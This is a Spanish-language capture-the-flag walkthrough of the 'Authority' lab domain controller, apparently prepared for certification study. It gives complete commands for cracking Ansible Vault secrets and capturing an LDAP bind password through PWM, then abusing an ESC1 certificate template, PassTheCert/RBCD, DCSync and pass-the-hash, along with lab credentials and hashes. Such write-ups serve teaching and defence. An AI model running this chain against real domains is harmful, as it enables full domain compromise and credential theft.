---
title: "Authority (Medium)"
date: 2026-11-07
author: "Isma"
slug: "authority"
tags: ["Windows", "AD", "SMB", "Ansible Vault", "Hash Cracking", "PWM", "ADCS", "ESC1", "PassTheCert", "RBCD"]
categories: ["Machine", "CPTS Preparation"]
draft: false
source: "obsidian"
---

## Resumen

Authority es un controlador de dominio con **AD CS** (servicios de certificados) y una instancia de **PWM**, un gestor de contraseñas LDAP, sobre Tomcat. Un recurso SMB accesible sin credenciales guarda los *playbooks* de **Ansible** que despliegan la infraestructura, con secretos cifrados con **Ansible Vault**. Crackeo la contraseña del vault y saco las credenciales del panel de PWM. Desde la configuración de PWM redirijo la conexión LDAP hacia mi máquina y capturo en claro la contraseña de `svc_ldap`. Con esa cuenta encuentro una plantilla de certificado vulnerable a **ESC1** que pueden usar todas las cuentas de equipo, así que creo una, pido un certificado a nombre de `Administrator` y, como el DC no admite PKINIT, me autentico con él por **LDAPS (Schannel)** usando **PassTheCert**. Con eso configuro **RBCD** sobre el DC y termino haciendo DCSync.

## Reconocimiento

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb)
| ssl-cert: Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
|_Issuer: commonName=htb-AUTHORITY-CA/domainComponent=htb
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
8443/tcp  open  ssl/http      Apache Tomcat
9389/tcp  open  mc-nmf        .NET Message Framing
Service Info: Host: AUTHORITY; OS: Windows

Host script results:
|_clock-skew: mean: 3h59m59s
```

Me fijo en tres cosas:

- Es un **controlador de dominio** de `authority.htb`.
- El certificado de LDAP lo emite **`htb-AUTHORITY-CA`**, así que hay una CA de empresa: AD CS es un objetivo claro.
- Hay un **Tomcat en el 8443**, algo raro en un DC, y un desfase de reloj de **+4 h** que tendré que corregir para usar Kerberos.

### SMB: el recurso Development

La sesión de invitado permite listar recursos y leer `Development`:

![authority](/images/obsidian/authority/pasted-image-20260903190812.png)

Dentro hay una estructura de **roles de Ansible** para automatizar AD, ADCS, LDAP y PWM:

![authority](/images/obsidian/authority/pasted-image-20260903191337.png)

En las plantillas de Tomcat aparecen credenciales en claro (que al final no necesito):

```xml
<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>
<user username="robot" password="T0mc@tR00t" roles="manager-script"/>
```

Lo interesante está en `PWM/defaults/main.yml`: varias variables cifradas con **Ansible Vault**, el mecanismo de Ansible para guardar secretos dentro de los playbooks.

![authority](/images/obsidian/authority/pasted-image-20260903191645.png)

## Acceso Inicial (Foothold)

### Crackeo de Ansible Vault

Cada bloque `$ANSIBLE_VAULT;1.1;AES256` va cifrado con una contraseña derivada con PBKDF2. Copio uno a un fichero, lo convierto a formato de John y lo crackeo:

![authority](/images/obsidian/authority/pasted-image-20260903193417.png)

```bash
ansible2john vault_hash.txt > hash_for_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash_for_john.txt
```

```
!@#$%^&*         (vault_hash.txt)
```

Con la contraseña del vault descifro los tres secretos:

```bash
ansible-vault decrypt vault_hash.txt --vault-password-file=<(echo '!@#$%^&*')
cat vault_hash.txt
```

![authority](/images/obsidian/authority/pasted-image-20260903194307.png)

| Variable | Valor |
|---|---|
| `pwm_admin_login` | `svc_pwm` |
| `pwm_admin_password` | `pWm_@dm!N_!23` |
| `ldap_admin_password` | `DevT3st@123` |

### PWM: capturar la contraseña de LDAP

En `https://authority.htb:8443/pwm` está **PWM**, una aplicación de autoservicio de contraseñas que se conecta al directorio con una cuenta de servicio. Está en modo configuración, y entro al **Configuration Manager** con la contraseña de `svc_pwm`:

![authority](/images/obsidian/authority/pasted-image-20260903194907.png)

En los ajustes de LDAP se ve la cuenta que usa PWM para conectarse al DC (`svc_ldap`), pero no su contraseña. Uso el mismo truco que con las impresoras: cambio la **LDAP URL** por `ldap://` (sin TLS) apuntando a mi IP y pulso *Test LDAP Profile*. PWM se conecta a mi listener con un **bind simple**, que envía la contraseña en texto claro:

![authority](/images/obsidian/authority/pasted-image-20260903195249.png)

```bash
nc -lvnp 389
```

![authority](/images/obsidian/authority/pasted-image-20260903195305.png)

```
svc_ldap : lDaP_1n_th3_cle4r!
```

Con estas credenciales entro por WinRM y leo la **User Flag**.

```bash
evil-winrm -i 10.129.118.116 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

## Escalada de Privilegios

### Enumeración de AD CS con Certipy

```bash
certipy-ad find -u svc_ldap@authority.htb -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.118.116 -vulnerable
```

La plantilla **`CorpVPN`** es vulnerable a **ESC1**:

![authority](/images/obsidian/authority/pasted-image-20260903231230.png)

```
"Enrollment Rights": [ "AUTHORITY.HTB\\Domain Computers", "Domain Admins", "Enterprise Admins" ]
"[!] Vulnerabilities": { "ESC1": "Enrollee supplies subject and template allows client authentication." }
```

**ESC1** se da cuando una plantilla permite que quien solicita el certificado **elija el sujeto** (el UPN/SAN) y además sirve para **autenticación de cliente**. Cualquiera con permiso de inscripción puede pedir un certificado "a nombre de" `Administrator` y la CA lo firmará.

- https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc1-enrollee-supplied-subject-for-client-authentication

### Crear una cuenta de equipo

El problema es que solo pueden inscribirse los **Domain Computers**, y `svc_ldap` es un usuario. Pero por defecto cualquier usuario del dominio puede crear hasta 10 cuentas de equipo (`ms-DS-MachineAccountQuota`), así que creo una:

```bash
impacket-addcomputer -computer-name 'PWNED$' -computer-pass 'Passw0rd123!' \
  -dc-ip 10.129.118.116 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!'
```

Y con ella pido el certificado con el UPN de `Administrator`:

```bash
certipy-ad req -u 'PWNED$@authority.htb' -p 'Passw0rd123!' -dc-ip 10.129.118.116 \
  -target authority.htb -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb
```

```
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Saving certificate and private key to 'administrator.pfx'
```

### PKINIT no funciona: PassTheCert por LDAPS

Lo normal sería usar el certificado con `certipy auth` para pedir un TGT mediante **PKINIT** (Kerberos con certificado), pero el DC responde **`KDC_ERR_PADATA_TYPE_NOSUPP`**: no tiene PKINIT disponible.

Sin embargo, hay otra forma de autenticarse con un certificado: **LDAPS con autenticación TLS de cliente (Schannel)**. Al presentar en la conexión TLS un certificado emitido por su propia CA, el DC lo mapea a la cuenta del UPN, `Administrator`, y la sesión LDAP pasa a tener sus permisos. La herramienta **PassTheCert** hace exactamente esto.

Separo el certificado y la clave del `.pfx`:

```bash
openssl pkcs12 -in administrator.pfx -nocerts -out administrator.key
openssl pkcs12 -in administrator.pfx -nokeys -out administrator.crt
openssl rsa -in administrator.key -out administrator.key
```

Con una sesión LDAP como `Administrator` podría hacer muchas cosas. Elijo configurar **RBCD** (*Resource-Based Constrained Delegation*): escribo en el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` del DC que mi equipo `PWNED$` puede delegar en él.

```bash
python3 passthecert.py -dc-ip 10.129.118.116 -crt administrator.crt -key administrator.key \
  -domain authority.htb -port 636 -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'PWNED$'
```

- https://github.com/AlmondOffSec/PassTheCert

### RBCD y DCSync

Con RBCD configurado, `PWNED$` puede usar **S4U2Self + S4U2Proxy** para pedir un ticket de servicio para el DC **suplantando a `Administrator`**. Como el reloj del DC va 4 horas por delante, ejecuto las herramientas de Kerberos con `faketime`:

```bash
faketime -f +4h impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator \
  'authority.htb/PWNED$:Passw0rd123!' -dc-ip 10.129.118.116
export KRB5CCNAME=Administrator@cifs_AUTHORITY.authority.htb@AUTHORITY.HTB.ccache
```

Con ese ticket hago **DCSync** y saco todos los hashes del dominio:

```bash
faketime -f +4h impacket-secretsdump -k -no-pass administrator@AUTHORITY.authority.htb -just-dc
```

![authority](/images/obsidian/authority/pasted-image-20260903233120.png)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
```

Con el hash NT de `Administrator` entro por Pass-the-Hash y leo la **Root Flag**:

```bash
evil-winrm -i 10.129.118.116 -u Administrator -H 6961f422924da90a6928197429eea4ed
```

## Conclusiones

- Los playbooks de Ansible en un recurso compartido son un mapa de la infraestructura. Ansible Vault con una contraseña débil no protege nada.
- Cualquier aplicación que permita cambiar a dónde se conecta (PWM, impresoras, escáneres…) y guarde credenciales es una fuente de contraseñas en claro.
- Una plantilla **ESC1** abierta a `Domain Computers` lo está en realidad a **todos los usuarios**, mientras `MachineAccountQuota` siga en 10.
- Que PKINIT no esté disponible no protege el certificado: Schannel sobre LDAPS sigue aceptándolo.
